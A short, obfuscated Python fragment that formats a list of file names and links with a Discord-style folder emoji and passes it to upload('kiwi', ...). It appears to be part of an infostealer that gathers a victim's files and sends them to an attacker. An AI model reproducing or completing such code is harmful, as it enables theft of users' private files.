                b =ffil [1 ]#line:973
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:974
            filetext +="\n"#line:975
    upload ("kiwi",filetext )
